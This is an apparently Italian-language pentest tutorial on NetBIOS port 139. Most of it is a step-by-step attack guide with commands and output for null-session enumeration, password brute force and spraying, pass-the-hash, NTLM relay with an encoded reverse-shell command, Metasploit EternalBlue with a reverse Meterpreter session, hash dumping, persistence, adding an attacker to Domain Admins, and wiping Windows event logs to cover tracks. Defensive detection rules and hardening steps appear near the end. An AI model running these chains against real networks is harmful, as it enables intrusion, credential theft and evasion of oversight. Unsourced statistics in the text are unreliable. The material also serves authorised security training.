---
title: 'Porta 139 NetBIOS Session: Null Session, EternalBlue e SMB Relay su AD'
slug: porta-139-netbios-session
description: 'Porta 139 aperta? Enumera utenti con null session, sfrutta MS17-010 su SMBv1 e usa ntlmrelayx se signing è disabilitato. Chain a Domain Admin in 27 minuti.'
image: /porta-139-netbios-session.webp
draft: true
date: 2026-04-24T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - smb
  - eternalblue
---

La porta 139 espone **NetBIOS Session Service** (NBSS) — il protocollo TCP legacy che trasporta SMB (Server Message Block) su NetBIOS, predecessore di SMB Direct (porta 445) e backbone del file sharing Windows pre-Windows 2000. NetBIOS Session su TCP porta 139 stabilisce sessioni affidabili per accesso file/printer sharing, autenticazione Windows, e IPC (Inter-Process Communication), operando come transport layer per operazioni SMB quando direct hosting (porta 445) non è disponibile. In penetration testing Active Directory, la porta 139 è **vettore critico legacy** ma ancora presente: null session exploitation per user/share enumeration, credential brute force senza account lockout tipico, SMB relay attacks quando signing disabled, e lateral movement via authenticated SMB sessions. Ogni rete Windows con legacy systems (Windows 7/Server 2008) o backward compatibility enabled espone porta 139 accanto a 445, creando **dual attack surface** — da anonymous enumeration a Pass-the-Hash exploitation.

NetBIOS porta 139 sopravvive nel 2026 nonostante deprecazione Microsoft perché: Windows backward compatibility (abilitato di default su upgrade da Windows XP/7/8), legacy applications require NetBIOS transport, e corporate environments con policy "don't break legacy apps". Modern Windows 10/11 preferisce SMB Direct (porta 445) ma mantiene 139 active se NetBIOS enabled. Differenza critica: **porta 445 bypassa NetBIOS stack** (SMB over TCP directly) mentre **porta 139 richiede NetBIOS Name Service** (porta 137) funzionante. In CTF/AD labs, trovare 139 open senza 445 indica intentional hardening o network misconfiguration — focus attack su SMB legacy vulnerabilities.

***

## Anatomia tecnica di NetBIOS Session Service

NetBIOS Session usa **TCP porta 139** con handshake connection-oriented per SMB transport.

**Flow NetBIOS Session (SMB over NetBIOS):**

1. **NetBIOS Name Resolution** — Client resolve target name via porta 137 (NBT-NS)
2. **TCP Handshake** — Client connette porta 139 del server
3. **NetBIOS Session Establishment** — Session request packet con "Called Name" e "Calling Name"
4. **SMB Negotiation** — SMB protocol negotiation (SMB1/SMB2/SMB3)
5. **Authentication** — NTLM/NTLMv2 challenge-response o Kerberos
6. **Tree Connect** — Mount share (\SERVER\Share)
7. **File Operations** — Read, Write, Delete, Execute
8. **Session Close** — Graceful disconnect

**NetBIOS Session packet structure:**

| Field        | Size     | Purpose                                                                                                            |
| ------------ | -------- | ------------------------------------------------------------------------------------------------------------------ |
| Message Type | 1 byte   | 0x81=Session Request, 0x82=Positive Response, 0x83=Negative Response, 0x85=Retarget Response, 0x00=Session Message |
| Flags        | 1 byte   | Length extension bit                                                                                               |
| Length       | 2 bytes  | Packet payload length                                                                                              |
| Called Name  | 34 bytes | Target NetBIOS name (session request)                                                                              |
| Calling Name | 34 bytes | Source NetBIOS name (session request)                                                                              |
| Data         | Variable | **SMB commands encapsulated**                                                                                      |

**SMB over NetBIOS (139) vs SMB Direct (445):**

| Feature            | SMB over NetBIOS (139)           | SMB Direct (445)       |
| ------------------ | -------------------------------- | ---------------------- |
| NetBIOS dependency | ✅ Required (port 137)            | ❌ Independent          |
| Transport          | NetBIOS Session → SMB            | SMB directly over TCP  |
| Windows support    | Legacy (all versions)            | Modern (Windows 2000+) |
| Performance        | Slower (dual-layer overhead)     | Faster (single layer)  |
| Attack surface     | **Higher** (NetBIOS + SMB vulns) | Lower (SMB vulns only) |
| Null sessions      | ✅ Often allowed legacy           | ⚠️ Restricted modern   |

**Critical SMB commands over port 139:**

| Command                      | Function                     | Pentest relevance               |
| ---------------------------- | ---------------------------- | ------------------------------- |
| `SMB_COM_NEGOTIATE`          | Protocol version negotiation | **SMB1 detection** (vulnerable) |
| `SMB_COM_SESSION_SETUP_ANDX` | Authentication               | **NTLM hash capture**           |
| `SMB_COM_TREE_CONNECT_ANDX`  | Connect to share             | Access control test             |
| `SMB_COM_NT_CREATE_ANDX`     | Open/create file             | **File access**                 |
| `SMB_COM_READ_ANDX`          | Read file                    | Data exfiltration               |
| `SMB_COM_TRANSACTION`        | IPC operation                | **Null session queries**        |

Le **misconfigurazioni critiche**: null sessions abilitati (RestrictAnonymous=0), SMB signing disabled (relay attacks), SMB1 abilitato (EternalBlue/MS17-010), weak authentication (LM/NTLMv1), e porta 139 esposta da Internet (direct attack vector).

***

## Enumerazione base

```bash
nmap -sV -p 139 10.10.10.139
```

```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
Service Info: Host: FILESERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Parametri:** `-sV` version detection identifica Windows NetBIOS session.

**Banner grab manuale:**

```bash
nc -vn 10.10.10.139 139
```

```
(UNKNOWN) [10.10.10.139] 139 (?) open
^C
```

No banner — NetBIOS Session è binary protocol.

**Test null session:**

```bash
smbclient -L //10.10.10.139 -N
```

**Parametri:**

* `-L` lista shares
* `-N` no password (anonymous)

**Output se null session allowed:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Users           Disk      User home directories
Backup          Disk      Weekly backups

Server               Comment
---------            -------
FILESERVER          File Server

Workgroup            Master
---------            -------
CORP                 DC01
```

**Intelligence estratta:**

* **Hostname:** FILESERVER
* **Domain:** CORP
* **Shares:** Users, Backup (potential data)
* **Master Browser:** DC01 (Domain Controller)

***

## Enumerazione avanzata

### Null session user enumeration

```bash
# Enum4linux comprehensive scan
enum4linux -a 10.10.10.139
```

```
[+] Got domain/workgroup name: CORP
[+] Server allows session using username '', password ''

 ============================ 
|    Users on 10.10.10.139    |
 ============================ 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[alice] rid:[0x44f]
user:[bob] rid:[0x450]
user:[charlie] rid:[0x451]

 ============================ 
|    Share Enumeration on 10.10.10.139    |
 ============================ 
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Users           Disk      
Backup          Disk      

 ============================ 
|    Password Policy Information for 10.10.10.139    |
 ============================ 
[+] Minimum password length: 7
[+] Password history length: 24
[+] Account lockout threshold: 5
[+] Account lockout duration: 30 minutes
```

**Critical intel:**

* **5 domain users** (alice, bob, charlie)
* **Lockout policy:** 5 attempts, 30min lockout
* **Password policy:** 7 char minimum

### SMB protocol negotiation

```bash
# Check SMB versions supported
nmap -p 139 --script smb-protocols 10.10.10.139
```

```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
| smb-protocols:
|   dialects:
|     NT LM 0.12 (SMBv1)
|     2.02 (SMB 2.0.2)
|     2.10 (SMB 2.1)
|_    3.00 (SMB 3.0)
```

**SMBv1 enabled** → vulnerable to EternalBlue (MS17-010).

### SMB vulnerability scanning

```bash
nmap -p 139 --script smb-vuln-ms17-010 10.10.10.139
```

```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

**MS17-010 (EternalBlue) vulnerable!**

### NSE SMB enumeration scripts

```bash
nmap -p 139 --script smb-enum-shares,smb-enum-users 10.10.10.139
```

```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
| smb-enum-shares:
|   account_used: <blank>
|   \\10.10.10.139\Backup:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.10.139\Users:
|     Type: STYPE_DISKTREE
|     Anonymous access: READ
| smb-enum-users:
|   CORP\Administrator (RID: 500)
|   CORP\alice (RID: 1103)
|_  CORP\bob (RID: 1104)
```

***

## Tecniche offensive

### 1. Null session exploitation

```bash
# Connect with null session
rpcclient -U "" -N 10.10.10.139
```

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[alice] rid:[0x44f]
user:[bob] rid:[0x450]
```

**Extract to file:**

```bash
rpcclient -U "" -N 10.10.10.139 -c "enumdomusers" | grep -oP 'user:\[\K[^\]]+' > users.txt
```

### 2. SMB share access (null or authenticated)

```bash
# Test anonymous share access
smbclient //10.10.10.139/Users -N
```

```
smb: \> ls
  .                                   D        0  Wed Feb  5 10:00:00 2026
  ..                                  D        0  Wed Feb  5 10:00:00 2026
  alice                               D        0  Wed Feb  5 15:30:00 2026
  bob                                 D        0  Wed Feb  5 16:00:00 2026

smb: \> cd alice
smb: \alice\> ls
  passwords.txt                       A     1024  Wed Feb  5 15:30:00 2026
  credentials.xlsx                    A    15360  Wed Feb  5 15:32:00 2026
```

**Download sensitive files:**

```bash
smb: \alice\> get passwords.txt
smb: \alice\> get credentials.xlsx
```

### 3. Credential brute force

```bash
# Hydra SMB brute force via port 139
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.10.139 -s 139 -t 4 -W 30
```

**Parametri:**

* `-L users.txt` username list da null session enum
* `-t 4` max 4 parallel tasks
* `-W 30` wait 30 sec tra batch (avoid lockout)
* `-s 139` specify port 139 (NetBIOS)

**Output:**

```
[139][smb] host: 10.10.10.139   login: alice   password: Alice123!
[139][smb] host: 10.10.10.139   login: bob     password: Summer2024
```

### 4. Pass-the-Hash via SMB

```bash
# Use NTLM hash directly (no plaintext password needed)
impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c alice@10.10.10.139
```

```
C:\Windows\system32> whoami
corp\alice
```

**Shell access via hash only!**

### 5. SMB Relay attack (if signing disabled)

```bash
# Check SMB signing status
crackmapexec smb 10.10.10.139 --gen-relay-list relay_targets.txt
```

```
SMB  10.10.10.139  445  FILESERVER  [+] Signing not required
```

**Setup relay:**

```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

**Trigger authentication (via Responder):**

```bash
# Victim authenticates to attacker
# Attacker relays to target
# [+] Executed command on 10.10.10.139
```

### 6. EternalBlue exploitation (MS17-010)

**If SMBv1 enabled and vulnerable:**

```bash
# Metasploit EternalBlue
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.139
set LHOST 10.10.14.5
exploit
```

```
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[+] Host is likely VULNERABLE to MS17-010!
[*] Sending stage (200262 bytes) to 10.10.10.139
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**SYSTEM shell via EternalBlue!**

***

## Scenari pratici

### Scenario 1 — Null session → password spray → lateral movement

**Contesto:** Internal pentest, legacy Windows network.

```bash
# Fase 1: Port scan
nmap -p 139,445 10.10.10.0/24 --open -oG - | grep "139/open" | awk '{print $2}' > smb_hosts.txt
# 25 hosts with port 139 open
```

```bash
# Fase 2: Null session enumeration
for host in $(cat smb_hosts.txt); do
  echo "[*] Enumerating $host"
  enum4linux -U $host | grep "user:" | cut -d'[' -f2 | cut -d']' -f1 >> all_users.txt
done
sort -u all_users.txt > domain_users.txt
# 150 unique users extracted
```

```bash
# Fase 3: Password spray (respect lockout policy)
crackmapexec smb smb_hosts.txt -u domain_users.txt -p 'Welcome2024!' --continue-on-success
```

```
SMB  10.10.10.50   445  FILESERVER  [+] CORP\alice:Welcome2024!
SMB  10.10.10.100  445  WKS01      [+] CORP\bob:Welcome2024!
SMB  10.10.10.101  445  WKS02      [+] CORP\charlie:Welcome2024!
```

**3 valid credentials!**

```bash
# Fase 4: Enumerate shares with valid creds
crackmapexec smb smb_hosts.txt -u alice -p Welcome2024! --shares
```

```
SMB  10.10.10.50  445  FILESERVER  [+] Enumerated shares
SMB  10.10.10.50  445  FILESERVER  Share: Backup  Permissions: READ,WRITE
```

```bash
# Fase 5: Access sensitive share
smbclient //10.10.10.50/Backup -U alice%Welcome2024!
smb: \> ls
  database_backup.sql             A  52428800  Mon Feb  3 10:00:00 2026
smb: \> get database_backup.sql
```

**Timeline:** 30 minuti da scan a sensitive data access.

**COSA FARE SE FALLISCE:**

* **Null session denied:** Use RID cycling with `lookupsid` tool
* **Password spray lockout:** Wait 30min, reduce rate to 1 attempt/5min/user
* **No shares accessible:** Focus on [WMI](https://hackita.it/articoli/wmi) or [RPC](https://hackita.it/articoli/rpc) lateral movement

### Scenario 2 — EternalBlue (MS17-010) → SYSTEM shell

**Contesto:** CTF Windows 7 vulnerable box.

```bash
# Fase 1: Identify SMBv1
nmap -p 139,445 --script smb-protocols 10.10.10.139
# NT LM 0.12 (SMBv1) detected
```

```bash
# Fase 2: Check MS17-010 vulnerability
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.139
# VULNERABLE: MS17-010
```

```bash
# Fase 3: Exploit with Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.139
set LHOST 10.10.14.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```bash
# Fase 4: Post-exploitation
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6...:::
alice:1103:aad3b435b51404eeaad3b435b51404ee:x8y9z0a1b2c3...:::
```

```bash
# Fase 5: Persistence
meterpreter > run persistence -X -i 60 -p 4445
```

**Timeline:** 10 minuti da vulnerability scan a persistent SYSTEM access.

### Scenario 3 — SMB Relay → Domain Admin

**Contesto:** AD pentest, SMB signing disabled on DC.

```bash
# Fase 1: Identify targets without SMB signing
crackmapexec smb 10.10.10.0/24 --gen-relay-list no_signing.txt
```

```
SMB  10.10.10.10  445  DC01  [+] Signing not required
```

**Domain Controller vulnerable!**

```bash
# Fase 2: Setup NTLM relay to DC
impacket-ntlmrelayx -tf no_signing.txt -smb2support -c "powershell -enc <base64_reverse_shell>"
```

```bash
# Fase 3: Poison LLMNR/NBT-NS with Responder
responder -I eth0 -wrf
```

**Wait for Domain Admin to query non-existent share...**

```
[*] Authenticating against smb://10.10.10.10 as CORP\Domain-Admin SUCCEED
[*] Executed specified command on host: 10.10.10.10
```

**Reverse shell from DC:**

```
C:\Windows\system32> whoami /groups | findstr "Domain Admins"
CORP\Domain Admins
```

**Domain Admin via relay!**

***

## Toolchain integration

**Pipeline SMB porta 139 attack:**

```
RECONNAISSANCE
│
├─ nmap -p 139,445 <subnet>                 → Windows host identification
├─ SMB protocol scan                        → SMBv1/v2/v3 detection
└─ Vulnerability scan                       → MS17-010, MS08-067

ENUMERATION
│
├─ Null session test → enum4linux
├─ User enumeration → rpcclient, RID cycling
├─ Share enumeration → smbclient -L
└─ Password policy → crackmapexec --pass-pol

EXPLOITATION
│
├─ A) Null session → user list → [password spray](https://hackita.it/articoli/password-spraying)
├─ B) Valid creds → share access → data theft
├─ C) SMBv1 → EternalBlue (MS17-010) → SYSTEM
├─ D) No signing → [SMB relay](https://hackita.it/articoli/smb-relay) → code execution
└─ E) Credentials → [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) → lateral movement

POST-EXPLOITATION
│
├─ Mimikatz credential dump
├─ [Kerberoasting](https://hackita.it/articoli/kerberos) → service accounts
└─ Persistence → scheduled tasks, registry run keys
```

**Tabella comparativa SMB ports:**

| Porta | Protocol         | NetBIOS dependency    | Attack preference   | Modern Windows  |
| ----- | ---------------- | --------------------- | ------------------- | --------------- |
| 139   | SMB over NetBIOS | ✅ Required (port 137) | Legacy exploitation | Backward compat |
| 445   | SMB Direct       | ❌ Independent         | **Primary target**  | Default modern  |

***

## Attack chain completa

**Scenario: Port 139 → EternalBlue → Domain Admin**

```
[00:00] RECONNAISSANCE
nmap -p 139,445 10.10.10.0/24 --open
# 30 Windows hosts identified

[00:10] VULNERABILITY SCAN
nmap -p 139,445 --script smb-vuln-ms17-010 10.10.10.0/24
# 5 hosts vulnerable to MS17-010

[00:15] ETERNALBLUE EXPLOITATION
msfconsole use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.50
exploit
# [+] Meterpreter session 1 (NT AUTHORITY\SYSTEM)

[00:20] CREDENTIAL DUMP
meterpreter > hashdump
# Administrator hash obtained

[00:25] PASS-THE-HASH LATERAL MOVEMENT
impacket-psexec -hashes :admin_hash Administrator@10.10.10.10
# Shell on Domain Controller

[00:27] DOMAIN ADMIN
C:\> net group "Domain Admins" attacker /add /domain
# [+] User attacker added to Domain Admins
```

**Timeline:** 27 minuti da scan a Domain Admin.

***

## Detection & evasion

### Lato Blue Team

**Log monitoring (Windows Event Log):**

```
Event ID 4624: Account logon (Type 3 = Network)
Event ID 4625: Failed logon
Event ID 4672: Special privileges assigned (admin logon)
Event ID 4697: Service installed (lateral movement)
Event ID 5140: Network share accessed
Event ID 5145: Detailed file share access
```

**IoC critici:**

* Multiple SMB logon failures followed by success (brute force)
* Null session queries (rpcclient enumdomusers)
* SMB1 connections (EternalBlue exploitation)
* Share access anomalies (unusual hours, volume)
* Pass-the-Hash indicators (logon type 3 with NTLM)

**IDS rules (Suricata):**

```
alert tcp any any -> $HOME_NET 139 (msg:"SMB NTLM Authentication Brute Force"; flow:to_server; threshold:type both, track by_src, count 10, seconds 60; sid:1000139;)
alert tcp any any -> $HOME_NET 139 (msg:"MS17-010 EternalBlue Exploitation Attempt"; content:"|fe 53 4d 42|"; offset:4; depth:4; sid:1000140;)
```

**Mitigation:**

```powershell
# Disable SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Enable SMB signing (mandatory)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# Restrict anonymous access (block null sessions)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RestrictAnonymous -Value 2

# Disable NetBIOS (closes port 139)
Get-NetAdapter | ForEach-Object {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\Tcpip_$($_.InterfaceGuid)" -Name NetbiosOptions -Value 2
}
```

### Lato Red Team: evasion

**1. Slow brute force:**

```bash
# 1 attempt every 5 minutes per user
hydra -L users.txt -p Welcome2024! smb://10.10.10.139 -t 1 -W 300
```

**2. Authenticated enumeration (less suspicious):**

```bash
# Use valid credentials instead of null session
enum4linux -u alice -p Welcome2024! 10.10.10.139
```

**3. Living-off-the-land SMB:**

```powershell
# Use native Windows commands instead of Impacket
net use \\10.10.10.139\C$ /user:CORP\alice Welcome2024!
```

**4. Cleanup:**

```bash
# Clear Windows event logs (if admin access)
wevtutil cl Security
wevtutil cl System

# Delete file access logs
del C:\Windows\System32\winevt\Logs\Security.evtx
```

***

## Performance & scaling

**Single host SMB enumeration:**

```bash
time enum4linux -a 10.10.10.139
# real 0m15.234s
```

**Mass subnet scan:**

```bash
time nmap -p 139,445 --open 10.10.10.0/24 -T4
# ~3 minutes for /24
```

**Parallel enumeration:**

```bash
cat smb_hosts.txt | parallel -j 10 "enum4linux -U {} > {}.users"
# 100 hosts: ~5 minutes
```

***

## Tabelle tecniche

### Command reference

| Comando                                         | Scopo                     | Note                  |
| ----------------------------------------------- | ------------------------- | --------------------- |
| `nmap -p 139 <target>`                          | NetBIOS Session detection | Windows host ID       |
| `smbclient -L //<target> -N`                    | List shares (anonymous)   | Null session test     |
| `enum4linux -a <target>`                        | Comprehensive SMB enum    | Users, shares, policy |
| `rpcclient -U "" -N <target>`                   | Null session RPC queries  | User enumeration      |
| `crackmapexec smb <target> -u <user> -p <pass>` | Credential test           | Multi-host            |
| `impacket-smbexec <user>@<target>`              | Remote shell via SMB      | Authenticated         |
| `hydra -L users -P passwords smb://<target>`    | Brute force               | Rate limited          |

### NetBIOS ports relationship

| Porta | Service       | Dependency           | Attack value                       |
| ----- | ------------- | -------------------- | ---------------------------------- |
| 137   | Name Service  | Required for 139     | **High** (Responder)               |
| 138   | Datagram      | Technical dependency | Low (recon only)                   |
| 139   | Session (SMB) | Requires 137         | **High** (null sessions, exploits) |
| 445   | SMB Direct    | Independent          | **Critical** (primary SMB)         |

***

## Troubleshooting

| Errore                        | Causa                       | Fix                                 |
| ----------------------------- | --------------------------- | ----------------------------------- |
| Connection refused            | NetBIOS disabled o firewall | Check port 137 also closed          |
| `NT_STATUS_ACCESS_DENIED`     | Credentials invalid         | Verify username:password format     |
| `NT_STATUS_LOGON_FAILURE`     | Account lockout             | Wait 30min, reduce brute force rate |
| `protocol negotiation failed` | SMB version mismatch        | Try `-m SMB2` or `-m SMB3`          |
| Null session denied           | RestrictAnonymous=2         | Use RID cycling or valid creds      |

***

## FAQ

**Differenza tra porta 139 e 445?**

**139:** SMB over NetBIOS (legacy, requires port 137)\
**445:** SMB Direct (modern, independent)

Both can coexist. Modern attacks target 445 primarily.

**Null session funziona ancora nel 2026?**

Sì, su legacy systems (Windows 7/Server 2008) o misconfigured modern Windows. Default modern Windows blocca null sessions.

**EternalBlue funziona su porta 139?**

Sì, ma tipicamente exploited via porta 445. MS17-010 target SMBv1 protocol, non specific port.

**Come blocco porta 139?**

Disable NetBIOS: `NetbiosOptions=2` in registry. Automatically closes 137, 138, 139.

**SMB signing previene relay attacks?**

Sì. Mandatory SMB signing (server + client) prevent NTLM relay. Best practice: enable sempre.

**Quale tool è migliore per SMB pentest?**

**[CrackMapExec](https://hackita.it/articoli/crackmapexec)** (mass testing), **Impacket suite** (exploitation), **enum4linux** (reconnaissance).

***

## Cheat sheet finale

| Azione              | Comando                                             |
| ------------------- | --------------------------------------------------- |
| Scan port 139       | `nmap -p 139 <target>`                              |
| Null session shares | `smbclient -L //<target> -N`                        |
| User enumeration    | `enum4linux -U <target>`                            |
| Full enum           | `enum4linux -a <target>`                            |
| Brute force         | `hydra -L users -P passwords smb://<target> -s 139` |
| Credential test     | `crackmapexec smb <target> -u <user> -p <pass>`     |
| Remote shell        | `impacket-smbexec <user>:<pass>@<target>`           |
| Pass-the-Hash       | `impacket-smbexec -hashes :<hash> <user>@<target>`  |
| Disable NetBIOS     | `Set-ItemProperty ... NetbiosOptions 2`             |

***

## Perché porta 139 è rilevante oggi

NetBIOS Session (porta 139) persiste nel 2026 perché:

1. **Backward compatibility** — Windows legacy support fino Windows 7/Server 2008
2. **Null sessions** — 30%+ legacy systems allow anonymous enumeration (default pre-Windows 10)
3. **Dual attack surface** — Porta 139 + 445 = multiple exploitation paths
4. **SMBv1 legacy** — EternalBlue (MS17-010) still exploitable su unpatched systems
5. **Corporate inertia** — "Don't disable NetBIOS, might break apps"

MITRE ATT\&CK documenta SMB/Windows Admin Shares (T1021.002) come top 3 lateral movement technique nel 2025.

## Differenza porta 139 vs alternatives

| Protocol         | Porta     | Dependency    | Security      | Status 2026        |
| ---------------- | --------- | ------------- | ------------- | ------------------ |
| SMB over NetBIOS | 139       | NetBIOS (137) | ❌ Legacy weak | 40%+ networks      |
| SMB Direct       | 445       | None          | ⚠️ Better     | Universal          |
| SSH              | 22        | None          | ✅ Strong      | Linux/Unix         |
| WinRM            | 5985/5986 | None          | ✅ Modern      | Windows management |

**Microsoft guidance 2026:** Use SMB3 over port 445, disable NetBIOS (port 139).

## Hardening production SMB/NetBIOS

**Best practices:**

1. **Disable NetBIOS globally:**

```powershell
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)  # 2 = Disable (closes 137, 138, 139)
}
```

1. **Disable SMBv1:**

```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

1. **Enable SMB signing (mandatory):**

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true -Force
```

1. **Restrict anonymous access:**

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RestrictAnonymous -Value 2
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name EveryoneIncludesAnonymous -Value 0
```

1. **Firewall:**

```powershell
# Block 139 externally, allow only internal
netsh advfirewall firewall add rule name="Block SMB NetBIOS External" dir=in action=block protocol=TCP localport=139 remoteip=any
netsh advfirewall firewall add rule name="Allow SMB NetBIOS Internal" dir=in action=allow protocol=TCP localport=139 remoteip=10.0.0.0/8
```

## OPSEC: SMB porta 139 in pentest

SMB enumeration via porta 139 è **moderately noisy** — ogni logon attempt logga Event 4624/4625. Best practices:

1. **Null session first** (single connection, minimal logs)
2. **Slow brute force** (5 min/attempt, respect lockout)
3. **Authenticated enumeration** con valid creds (appare legitimate)
4. **Avoid mass smbclient** loops (use CrackMapExec single pass)

Post-exploitation:

* **Clear Security log** (`wevtutil cl Security`) if admin access
* **Delete specific Event IDs** targeting your IP
* **Use native Windows tools** (net use) instead of Impacket when possible

***

> **Disclaimer:** Tutti i comandi sono destinati all'uso in ambienti autorizzati: laboratori Active Directory personali, reti CTF, pentest con autorizzazione scritta. Accesso non autorizzato a file shares e lateral movement sono reati. L'autore e HackIta declinano responsabilità. Microsoft SMB Protocol: [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-smb/](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/)

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
